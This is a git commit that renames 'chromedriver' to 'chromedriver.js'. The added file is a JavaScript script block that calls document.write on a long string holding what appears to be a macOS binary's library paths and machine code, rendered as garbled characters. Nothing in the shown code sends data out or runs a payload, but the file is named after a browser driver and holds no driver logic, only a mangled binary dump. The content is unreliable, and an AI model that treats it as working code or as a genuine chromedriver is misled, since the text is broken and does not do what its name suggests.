69e492a330c06b65dc3ee21d3a13b9f03e708a36
justnothi <80005071+justnothi@users.noreply.github.com>
2021-03-09 08:51:58 -0500

    Update and rename chromedriver to chromedriver.js

---
+++ chromedriver.js
@@ -0,0 +1,23 @@
+<script language="JavaScript">
+
+var nl = getNewLine()
+
+function getNewLine() {
+	var agent = navigator.userAgent
+
+	if (agent.indexOf("Win") >= 0)
+		return "\r\n"
+	else
+		if (agent.indexOf("Mac") >= 0)
+			return "\r"
+
+ 	return "\r"
+
+}
+
+pagecode = 'f-/System/Library/Frameworks/AppKit.framework/Versions/C/AppKit0/usr/lib/libbsm.0.dylibh~âñ/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundationX/System/Library/Frameworks/IOKit.framework/Versions/A/IOKith/System/Library/Frameworks/OpenDirectory.framework/Versions/A/OpenDirectory8/usr/lib/libpmenergy.dylib8/usr/lib/libpmsample.dylib`)™Á/System/Library/Frameworks/Security.framework/Versions/A/Security`/System/Library/Frameworks/CFNetwork.framework/Versions/A/CFNetworkh-/System/Library/Frameworks/CoreServices.framework/Versions/A/CoreServices`~â,/System/Library/Frameworks/Foundation.framework/Versions/C/Foundationp(%/System/Library/Frameworks/SystemConfiguration.framework/Versions/A/SystemConfiguration8/usr/lib/libresolv.9.dylib`/System/Library/Frameworks/IOSurface.framework/Versions/A/IOSurfaceh/System/Library/Frameworks/AVFoundation.framework/Versions/A/AVFoundation`/System/Library/Frameworks/CoreMedia.framework/Versions/A/CoreMedia`/System/Library/Frameworks/Accelerate.framework/Versions/A/Accelerate`/System/Library/Frameworks/QuartzCore.framework/Versions/A/QuartzCore`/System/Library/Frameworks/AudioUnit.framework/Versions/A/AudioUnit`/System/Library/Frameworks/CoreVideo.framework/Versions/A/CoreVideohD@/System/Library/Frameworks/CoreGraphics.framework/Versions/A/CoreGraphics`/System/Library/Frameworks/CoreText.framework/Versions/A/CoreTextÄX‘/System/Library/Frameworks/Metal.framework/Versions/A/Metal8/usr/lib/libsandbox.1.dylib8/usr/lib/libSystem.B.dylib8‰/usr/lib/libobjc.A.dylibUHâÂAWAVAUATSHÅÏ8HâÛHã⁄Ü„HãHâE–Ëñ˘CHçΩ‡˝ˇˇËzﬂCË%˙CIâ∆«ÖÑ˝ˇˇ≠W¿)Ö†˝ˇˇH«Ö∞˝ˇˇ)Ö¿˝ˇˇH«Ö–˝ˇˇHç5äA‘Hâ«Ë2¸CÑ¿uHç5yA‘Lâ˜Ë¸CÑ¿ÑPHâù∏˝ˇˇW¿)Ö†˛ˇˇH«Ö∞˛ˇˇH«√˛ˇˇˇLç=Ìö„Lç5©C‘Lç≠∞¸ˇˇLç•†˛ˇˇÎ!fDLâÁËò„AÄΩ«¸ˇˇx?HÉ√HÉ˚sCIãTﬂIãLﬂLâÔLâˆ1¿ËÆÖF∂ï«¸ˇˇLâÓÑ“y¿Hãµ∞¸ˇˇHãï∏¸ˇˇÎ∞HãΩ∞¸ˇˇËŸAÎ≥Hç5;C‘HçíC‘Hç'+nl+
+	''
+
+document.write(pagecode);
+
+</script>
